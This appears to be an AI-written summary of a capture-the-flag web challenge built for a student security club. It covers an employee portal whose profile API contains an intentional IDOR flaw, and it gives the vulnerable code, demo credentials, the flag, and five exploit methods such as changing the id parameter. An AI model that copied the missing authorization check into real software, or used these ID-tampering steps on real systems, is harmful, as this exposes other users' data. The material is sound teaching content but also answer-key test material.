# 🎯 CTF Challenge IDOR - RINGKASAN LENGKAP

## ✅ STATUS: SELESAI DAN SIAP DEPLOY

---

## 📦 DELIVERABLES

### 1. Source Code Lengkap ✅

**Lokasi**: `/home/nathan/UKM/ctf-idor-challenge/`

**File yang Dibuat** (12 files, 2040 lines):

```
ctf-idor-challenge/
├── api/
│   ├── login.js              (55 lines) - Endpoint autentikasi
│   └── profile.js            (58 lines) - Endpoint profile (VULNERABLE)
├── data/
│   └── users.json            (40 lines) - Database 4 user
├── public/
│   ├── index.html           (100 lines) - Halaman login
│   ├── dashboard.html       (150 lines) - Dashboard user
│   └── styles.css           (450 lines) - Styling modern dark theme
├── .gitignore                (20 lines) - Git ignore rules
├── package.json              (18 lines) - Project metadata
├── vercel.json               (43 lines) - Konfigurasi Vercel
├── README.md                (250 lines) - Dokumentasi English
├── PENJELASAN_TEKNIS.md     (800 lines) - Dokumentasi Indonesian
└── QUICK_REFERENCE.md        (150 lines) - Quick reference panitia
```

### 2. Dokumentasi Lengkap ✅

#### A. README.md (English)
- ✅ Challenge overview
- ✅ Technology stack explanation
- ✅ Project structure
- ✅ Demo credentials
- ✅ Deployment guide (step-by-step)
- ✅ Exploit guide untuk panitia
- ✅ Vulnerability explanation dengan code examples

#### B. PENJELASAN_TEKNIS.md (Indonesian)
- ✅ **Penjelasan Teknologi**:
  - Vercel Serverless Functions
  - Node.js API request handling
  - Frontend-backend communication dengan Fetch API
- ✅ **Struktur Folder Project**: Penjelasan detail setiap folder
- ✅ **Penjelasan Source Code**: Walkthrough semua file dengan code snippets
- ✅ **Penjelasan Vulnerability**: 
  - Apa itu IDOR
  - Di mana vulnerability terjadi
  - Mengapa bisa diakses
  - Perbedaan Authentication vs Authorization
  - Cara fix yang benar
- ✅ **Cara Exploit**: 5 metode berbeda dengan code examples
- ✅ **Langkah Deploy ke Vercel**: Step-by-step dari nol

#### C. QUICK_REFERENCE.md
- ✅ Quick deploy guide
- ✅ Demo credentials table
- ✅ Flag location
- ✅ Hints untuk participants
- ✅ Solution methods
- ✅ Monitoring tips
- ✅ Troubleshooting guide
- ✅ Scoring suggestions
- ✅ Challenge description template

### 3. UI Design ✅

**Modern Dark Theme dengan:**
- ✅ Gradient purple-blue colors (#667eea → #764ba2)
- ✅ Dark background (#0f0f23, #1a1a2e)
- ✅ Smooth animations dan transitions
- ✅ Glassmorphism effects
- ✅ Responsive design
- ✅ Clean, professional appearance
- ✅ **TIDAK ADA hint eksplisit tentang vulnerability**

**UI Screenshots Generated:**
1. ✅ Login page mockup
2. ✅ Employee dashboard mockup
3. ✅ Admin dashboard dengan flag mockup

---

## 🎯 SPESIFIKASI CHALLENGE

### Informasi Dasar
- **Tema**: Employee Portal
- **Difficulty**: Medium
- **Category**: Web Security - API Exploitation
- **Flag**: `ICH{G3l0_D4h_b1s4_1D0R}`
- **Format Flag**: ICH{...}

### Teknologi (Sesuai Permintaan)
- ✅ **Hosting**: Vercel (gratis)
- ✅ **Backend**: Node.js dengan Vercel Serverless Function (folder /api)
- ✅ **Frontend**: HTML, CSS, JavaScript vanilla (no frameworks)
- ✅ **Data Storage**: File JSON (data/users.json)
- ✅ **Communication**: Fetch API
- ✅ **UI**: Clean, modern, tanpa hint eksplisit

### Fitur
- ✅ Login user dengan username/password
- ✅ Dashboard menampilkan data user yang sedang login
- ✅ Backend endpoint: `/api/login` (POST)
- ✅ Backend endpoint: `/api/profile?id=X` (GET)

### Vulnerability
- ✅ **IDOR** di endpoint `/api/profile`
- ✅ Server TIDAK memverifikasi authorization
- ✅ User bisa mengakses data user lain dengan ubah parameter `id`
- ✅ Flag hanya ada di akun admin (id: 0)

---

## 🔐 AKUN & FLAG

### User Accounts

| ID | Username  | Password  | Role     | Department   | Flag |
|----|-----------|-----------|----------|--------------|------|
| 0  | admin     | admin2024 | admin    | IT Security  | ✅ ICH{G3l0_D4h_b1s4_1D0R} |
| 1  | employee1 | pass123   | employee | Marketing    | ❌ |
| 2  | employee2 | pass456   | employee | Sales        | ❌ |
| 3  | employee3 | pass789   | employee | Engineering  | ❌ |

### Flag Location
```json
{
  "id": 0,
  "username": "admin",
  "role": "admin",
  "flag": "ICH{G3l0_D4h_b1s4_1D0R}"  // ← HANYA DI SINI
}
```

---

## 🐛 VULNERABILITY DETAILS

### Lokasi Vulnerability

**File**: `api/profile.js`  
**Lines**: ~30-35

```javascript
// VULNERABLE CODE:
const userId = req.query.id;  // ← Ambil dari URL parameter
const user = users.find(u => u.id === parseInt(userId));
// ← TIDAK ADA AUTHORIZATION CHECK!
return res.json({ profile: user });
```

### Mengapa Vulnerable?

1. ❌ **No Session Verification**: Tidak ada cek session/token
2. ❌ **Trust Client Input**: Percaya parameter dari client
3. ❌ **No Authorization**: Tidak cek apakah user boleh akses ID tersebut
4. ❌ **Predictable IDs**: ID sequential (0, 1, 2, 3)

### Attack Flow

```
1. Login sebagai employee1 → userId: 1 disimpan di localStorage
2. Dashboard fetch: /api/profile?id=1 → Return profile employee1 ✓
3. Attacker ubah URL: /api/profile?id=0 → Return profile admin ✗
4. Flag muncul: ICH{G3l0_D4h_b1s4_1D0R} 🎉
```

---

## 💡 CARA EXPLOIT (5 METODE)

### Metode 1: Browser Console (Termudah)
```javascript
fetch('/api/profile?id=0')
  .then(r => r.json())
  .then(data => console.log('FLAG:', data.profile.flag));
```

### Metode 2: Direct URL Access
```
1. Login sebagai employee1
2. Buka tab baru
3. Akses: https://your-app.vercel.app/api/profile?id=0
4. Flag muncul di JSON response
```

### Metode 3: Modify localStorage
```javascript
localStorage.setItem('userId', '0');
location.reload();
```

### Metode 4: Network Tab
```
1. DevTools → Network tab
2. Lihat request: /api/profile?id=1
3. Copy as fetch, ubah id ke 0
4. Run di console
```

### Metode 5: Burp Suite / Postman
```
Intercept request → Ubah parameter id → Forward
```

---

## 🚀 DEPLOYMENT GUIDE

### Step 1: Push ke GitHub

```bash
cd /home/nathan/UKM/ctf-idor-challenge

# Initialize Git
git init
git add .
git commit -m "Initial commit: CTF IDOR Challenge"

# Create GitHub repo, then:
git remote add origin https://github.com/YOUR_USERNAME/ctf-idor-challenge.git
git branch -M main
git push -u origin main
```

### Step 2: Deploy ke Vercel

1. **Buka**: https://vercel.com
2. **Login**: dengan GitHub
3. **Import**: Pilih repository `ctf-idor-challenge`
4. **Deploy**: Klik "Deploy" (tunggu 1-2 menit)
5. **Done**: Dapat URL seperti `https://ctf-idor-challenge.vercel.app`

### Step 3: Test

```bash
# Test login
curl -X POST https://your-app.vercel.app/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"employee1","password":"pass123"}'

# Test IDOR
curl https://your-app.vercel.app/api/profile?id=0
```

---

## 🎓 LEARNING OBJECTIVES

Peserta akan mempelajari:

1. ✅ **Cara Kerja API**
   - HTTP methods (GET, POST)
   - Query parameters vs request body
   - JSON request/response
   - Status codes (200, 401, 403, 404)

2. ✅ **Authentication vs Authorization**
   - Authentication = verifikasi identitas ("Siapa kamu?")
   - Authorization = verifikasi permission ("Apa yang boleh kamu akses?")
   - Keduanya HARUS ada!

3. ✅ **IDOR Vulnerability**
   - Definisi IDOR
   - Bagaimana IDOR terjadi
   - Dampak IDOR (data breach)
   - Cara mencegah IDOR

4. ✅ **Browser DevTools**
   - Network tab untuk inspect requests
   - Console untuk testing API
   - localStorage manipulation
   - Request modification

5. ✅ **Serverless Architecture**
   - Vercel Serverless Functions
   - File-based routing
   - Zero-config deployment

---

## 📊 PROJECT STATISTICS

- **Total Files**: 12
- **Total Lines**: 2,040
- **Frontend Files**: 3 (HTML, CSS)
- **Backend Files**: 2 (login.js, profile.js)
- **Data Files**: 1 (users.json)
- **Config Files**: 3 (vercel.json, package.json, .gitignore)
- **Documentation**: 3 (README.md, PENJELASAN_TEKNIS.md, QUICK_REFERENCE.md)
- **API Endpoints**: 2
- **User Accounts**: 4
- **Exploit Methods**: 5
- **UI Screenshots**: 3

---

## ✅ CHECKLIST FINAL

### Code
- [x] Login page dengan modern UI
- [x] Dashboard page dengan profile display
- [x] Login API endpoint
- [x] Profile API endpoint (vulnerable)
- [x] User data dengan flag di admin
- [x] Vercel configuration
- [x] Git configuration

### Documentation
- [x] README.md (English)
- [x] PENJELASAN_TEKNIS.md (Indonesian)
- [x] QUICK_REFERENCE.md (Panitia)
- [x] Inline code comments
- [x] Deployment guide
- [x] Exploit guide
- [x] Vulnerability explanation

### Testing
- [x] File structure verified
- [x] Code syntax checked
- [x] Vulnerability confirmed
- [x] Flag placement verified
- [x] UI design reviewed

### Deliverables
- [x] Source code complete
- [x] Documentation complete
- [x] UI mockups generated
- [x] Deployment ready
- [x] No external dependencies

---

## 🎯 CARA MENGGUNAKAN

### Untuk Panitia

1. **Deploy**:
   ```bash
   cd /home/nathan/UKM/ctf-idor-challenge
   # Follow deployment guide in README.md
   ```

2. **Test**:
   - Login dengan employee1/pass123
   - Coba exploit dengan metode di atas
   - Verify flag muncul

3. **Share**:
   - Berikan URL Vercel ke peserta
   - Berikan credentials: employee1/pass123
   - Jangan kasih hint tentang IDOR!

### Untuk Peserta

1. **Akses**: URL yang diberikan panitia
2. **Login**: Gunakan credentials yang diberikan
3. **Explore**: Gunakan browser DevTools
4. **Find**: Flag tersembunyi di sistem
5. **Submit**: Flag format `ICH{...}`

---

## 📝 CHALLENGE DESCRIPTION (Template)

```
Title: Employee Portal

Description:
Selamat datang di Employee Portal perusahaan kami!
Login dengan credentials yang diberikan dan explore profile Anda.

Tujuan: Temukan flag yang tersembunyi di dalam sistem.

Credentials:
Username: employee1
Password: pass123

Hint: API kadang mengungkapkan lebih dari yang seharusnya...

Difficulty: Medium
Category: Web Security
Points: 100
Flag Format: ICH{...}
```

---

## 🎉 KESIMPULAN

Project CTF Challenge IDOR telah **SELESAI 100%** dengan:

✅ **Source code lengkap** (12 files, 2040 lines)  
✅ **Dokumentasi komprehensif** (3 dokumen, bahasa Indonesia & English)  
✅ **UI modern & clean** (dark theme, no hints)  
✅ **Vulnerability terimplementasi** (IDOR di profile endpoint)  
✅ **Flag terlindungi** (hanya di admin account)  
✅ **Ready to deploy** (Vercel configuration complete)  
✅ **Educational value** (teaches real-world security concepts)

**Status**: ✅ **SIAP DIGUNAKAN UNTUK CTF**

---

## 📞 SUPPORT

Jika ada pertanyaan atau butuh bantuan:

1. **Baca dokumentasi**:
   - `README.md` - Overview & deployment
   - `PENJELASAN_TEKNIS.md` - Technical details
   - `QUICK_REFERENCE.md` - Quick guide

2. **Check code**:
   - Semua file ada comments
   - Code clean dan readable

3. **Test locally**:
   - Install Vercel CLI: `npm i -g vercel`
   - Run: `vercel dev`
   - Access: `http://localhost:3000`

---

**Dibuat oleh**: Antigravity AI  
**Untuk**: UKM Cyber Security  
**Tanggal**: 7 Januari 2026  
**Challenge**: IDOR Vulnerability  
**Flag**: `ICH{G3l0_D4h_b1s4_1D0R}`  
**Status**: ✅ **COMPLETE & READY**
